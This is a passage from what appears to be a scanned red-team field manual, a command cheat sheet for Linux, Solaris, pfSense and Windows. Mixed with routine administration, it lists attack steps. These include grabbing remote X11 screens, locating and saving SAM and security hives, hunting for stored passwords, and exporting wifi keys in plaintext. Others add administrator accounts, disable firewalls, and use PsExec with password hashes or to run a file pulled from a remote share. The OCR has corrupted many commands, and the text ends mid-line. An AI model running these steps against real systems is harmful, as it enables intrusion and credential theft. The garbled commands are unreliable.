iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o ethO -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED "
iptables -A LOGGING -j DROP
10
UPDATE-RC.D
• Check/change startup services
service --status-all [+] Service starts at boot
[-] Service does not start
service service start Start a service
service service stop Stop a service
service service status Check status of a service
update-rc.d -f service remove Remove a service start up cmd (
f if the /etc/init.d start up
file exists I
update-rc.d service defaults Add a start up service
CHKCONFIG
• Available in Linux distributions such as Red Hat Enterprise Linux (RHEL),
CentOS and Oracle Enterprise Linux (OEL)
chkconfig --list List existing services and run
status
chkconfig service -list Check single service status
chkconfig service on [--level 3] Add service [optional to add
level at which service runs]
chkconfig service off [--level 3] Remove service
e.g. chkconfig iptables off
SCREEN
(C-a ~~ Control-a)
screen -S name Start new screen with name
screen -ls List running screens
screen -r name Attach to screen name
screen -S name -X cmd Send crnd to screen anrne
C-a List keybindings (help)
C-a d Detach
C-a D D Detach and logout
C-a c Create new window
C-a C-a Switch to last active window
C-a ' numlname Switch to window numlname
C-a " See windows list and change
C-a k Kill current window
C-a S Split display horizontally
C-a V Split display vertically
C-a tab Jump to next display
C-a X Remove current region
C-a Q Remove all regions but current
11
Xll
CAPTURE REMOTE Xll WINDOWS AND CONVERT TO JPG
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
OPEN Xll STREAM VIEWING
xwd -display 1.1.1.1:0 -root -silent -out x11dump
Read dumped file with xwudtopnm or GIMP
TCPDUMP
CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
tcpdump -i ethO -XX -w out.pcap
CAPTURE HTTP TRAFFIC TO 2 . 2 . 2 . 2
tcpdump -i ethO port 80 dst 2.2.2.2
SHOW CONNECTIONS TO A SPECIFIC IP
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24
PRINT ALL PING RESPONSES
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
tcpdump -i ethO -c 50 -tttt 'udp and port 53'
NATIVE KALI COMMANDS
WMIC EQUIVALENT
wmis -U DOMAIN\ user % password II· DC cmd.exe /c command
MoUNT SMB SHARE
# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
mount.cifs // ip /share /mnt/share -o
user= user ,pass= pass ,sec=ntlrnssp,domain= domain ,rw
UPDATING KALI
apt-get update
apt-get upgrade
12
PFSENSE
pfSsh.php pfSense Shell System
pfSsh.php playback enableallowallwan Allow all inbound WAN
connections (adds to visible
rules in WAN rules)
pfSsh.php playback enablesshd Enable ssh inbound/outbound
pfctl -sn Show NAT rules
pfctl -sr Show filter rules
pfctl -sa Show all rules
viconfig Edit config
rm /tmp/config.cache Remove cached (backup)
config after editing the
current running
/etc/rc.reload_all Reload entire config
SOLARIS
ifconfig -a List of interfaces
netstat -in List of interface
ifconfig -r Route listing
ifconfig ethO dhcp Start DHCP client
ifconfig ethO plumb up ip netmask nmask Set IP
route add default ip Set gateway
logins -p List users w/out passwords
svcs -a List all services w/ status
prstat -a Process listing (top)
svcadm start ssh Start SSH service
inetadm -e telnet (-d for disable) Enable telnet
prtconf I grep Memorj Total physical memory
iostat -En Hard disk size
showrev -c /usr/bin/bash Information on a binary
shutdown -i6 -gO -y Restart system
dfmounts List clients connected NFS
smc t1anagement GUI
snoop -d int -c pkt # -o results.pcap Packet capture
/etc/vfstab File system mount table
/var/adm/logging Login attempt log
/etc/default/' Default settings
/etc/system Kernel modules & config
/var/adm/messages Syslog location
/etc/auto ' Automounter config files
/etc/inet/ipnodes IPv4/IPv6 host file
13
WINDOWS VERSIONS
NT 3.1 Windows NT 3.1 (All)
NT 3.5 Windows NT 3.5 (All)
NT 3.51 Windows NT 3.51 (All)
NT 4.0 Windows NT 4.0 (All)
NT 5.0 Windows 2000 (All)
NT 5.1 Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
NT 5.2 Windows XP (64-bit, Pro 64-bit)
Windows Server 2003 & R2 (Standard, Enterprise)
Windows Home Server
NT 6.0 Windows Vista (Starter, Home, Basic, Home Premium,
Business, Enterprise, Ultimate)
Windows Server 2008 (Foundation, Standard, Enterprise)
NT 6.1 Windows ~ (Starter, Home, Pro, Enterprise, Ultimate)
Windows Server 2008 R2 (Foundation, Standard, Enterprise)
NT 6.2 Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM))
Windows Phone 8
Windows Server 2012 (Foundation, Essentials, Standard)
WINDOWS FILES
%SYSTEt~ROOT% Typically C:\Windows
%SYSTEMROOT%\System32\drivers\etc\hosts DNS entries
%SYSTEMROOT%\System32\drivers\etc\networks Network settings
%SYSTEt~ROOT% \ system32 \ config\SAM User & password hashes
%SYSTEMROOT%\repair\SAt~ Backup copy of SAt~
%SYSTEMROOT%\System32\config\RegBack\SAt~ Backup copy of SAt~
%WINDIR%\system32\config\AppEvent.Evt Application Log
%WINDIR%\system32\config\SecEvent.Evt Security Log
%ALLUSERSPROFILE%\Start Menu\Programs\Startup\ Startup Location
%USERPROFILE%\Start Menu\Programs\Startup\ Startup Location
%SYSTEMROOT%\Prefetch Prefetch dir (EXE logs)
STARTUP DIRECTORIES
WINDOWS NT 6.1,6.0
# All users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
# Specific users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup
WINDOWS NT 5.2, 5.1, 5.0
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
WINDOWS 9x
%SystemDrive%\wmiOWS\Start Menu\Programs\Startup
WINDOWS NT 4. 0, 3. 51, 3. 50
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
15
WINDOWS SYSTEM INFO COMMANDS
ver Get OS version
sc query state=all Show services
tasklist /svc Show processes & services
tasklist /m Show all processes & DLLs
tasklist /S ip /v Remote process listing
taskkill /PID pid /F Force process to terminate
systeminfo /S ip /U domain\user /P Pwd Remote system info
reg query\\ ip \ RegDomain \ Key /v Query remote registry,
Value /s=all values
reg query HKLM /f password /t REG SZ /s Search registrj for password
fsutil fsinfo drives - List drives •must be admin
dir /a /s /b c:\'.pdf' Search for all PDFs
dir /a /b c:\windows\kb' Search for patches
findstr /si password' .txt I •.xmll •.xls Search files for password
tree /F /A c:\ tree.txt Directory listing of C:
reg save HKLl~\Security security.hive Save securitj hive to file
echo %USERNAl~E% Current user
WINDOWS NET /DOMAIN COMMANDS
net view /domain Hosts in current domain
net view /domain: [t~YDOHAIN] Hosts in [l~YDOl1AIN]
net user /domain All users in current domain
net user user pass /add Add user
net localgroup "Administrators" user /add Add user to Administrators
net accounts /domain Domain password policy
net localgroup "Administrators" List local Admins
net group /domain List domain groups
net group "Domain Adrnins" /domain List users in Domain Adrnins
net group "Domain Controllers11 /domain List DCs for current domain
net share Current SMB shares
net session I find I "\\" Active SHB sessions
net user user /ACTIVE:jes /domain Unlock domain user account
net user user '' newpassword '' /domain Change domain user password
net share share c:\share Share folder
/GRANT:Everyone,FULL
WINDOWS REMOTE COMMANDS
tasklist /S ip /v Remote process listing
systeminfo /S ip /U domain\user /P Pwd Remote systeminfo
net share \\ ip Shares of remote computer
net use \\ ip Remote filesystem (IPC$)
net use z: \\ ip \share password l~ap drive, specified
/user: D0l1AIN\ user credentials
reg add \\ ip \ regkej \ value Add registry key remotely
sc \\ ip create service Create a remote service
binpath=C:\Windows\System32\x.exe start= (space after start=)
auto
xcopy /s \\ ip \dir C:\local Copy remote folder
shutdown /m \\ ip /r /t 0 /f Remotely reboot machine
16
WINDOWS NETWORK COMMANDS
ipconfig I all IP configuration
ipconfig /displaydns Local DNS cache
netstat -ana Open connections
netstat -anop tcp 1 Netstat loop
netstat -ani findstr LISTENING LISTENING ports
route print Routing table
arp -a Known l1ACs (ARP table I
nslookup, set type=any, ls -d domain DNS Zone Xfer
results.txt, exit
nslookup -type=SRV _www._tcp.url.com Domain SRV lookup ( ldap,
kerberos, sip)
tftp -I ip GET remotefile TFTP file transfer
netsh wlan show profiles Saved wireless profiles
netsh firewall set opmode disable Disable firewall ('Old)
netsh wlan export profile folder=. key=clear Export wifi plaintext pwd
netsh interface ip show interfaces List interface IDs/MTUs
netsh interface ip set address local static Set IP
ip nmask gw ID
netsh interface ip set dns local static ip Set DNS server
netsh interface ip set address local dhcp Set interface to use DHCP
WINDOWS UTILITY COMMANDS
type file Display file contents
del path\' .• /a /s /q /f Forceably delete all files
in path
find /I ''str'' filename Find "str"
command I find /c /v Line count of cmd output
at HH:Ml1 file [args] (i.e. at 14:45 cmd Schedule file to run
/c)
runas /user: user " file [args]11 Run file as user
restart /r /t 0 Restart now
tr -d '\15\32' win.txt unix.txt Removes CR & 'Z ('nix)
makecab file Native compression
Wusa.exe /uninstall /kb: ### Uninstall patch
cmd.exe "wevtutil qe Application /c:40 CLI Event Viewer
/f:text /rd:true"
lusrrngr.rnsc Local user manager
services.msc Services control panel
taskmgr.exe Task manager
secpool.rnsc Security policy manager
eventvwr.rnsc Event viewer
1?
MISC. COMMANDS
LoCK WORKSTATION
rundll32.dll user32.dll LockWorkstation
DISABLE WINDOWS FIREWALL
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
*
NATIVE WINDOWS PORT FORWARD ( MUST BE ADMIN)
netsh interface portproxy add v4tov4 listenport=3000
listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
#Remove
netsh interface portproxy delete v4tov4 listenport=3000
listenaddress=l.l.l.l
RE-ENABLE COMMAND PROMPT
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t
REG DWORD /d 0 /f
PSEXEC
EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS
psexec /accepteula \\ targetiP -u domain\user -p password -c -f
\\ smbiP \share\file.exe
RUN REMOTE COMMAND WITH SPECIFIED HASH
psexec /accepteula \\ ip -u Domain\user -p Lt1 NTLH cmd.exe /c dir
c:\Progra-1
RUN REMOTE COMMAND AS SYSTEM
psexec /accepteula \\ ip -s cmd.exe
18
TERMINAL SERVICES (RDP)
START RDP
1. Create regfile.reg file with following line in it:
HKEY LOCAL t1ACHINE\SYSTEH\CurrentControlSet \Control\ TerminalService
2. "fDe~yTSCo~nections"=dword: 00000000
3. reg import reg file. reg
4. net start ''terrnservice''
5. sc config terrnservice start= auto
6. net start terrnservice
--OR-
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control \Terminal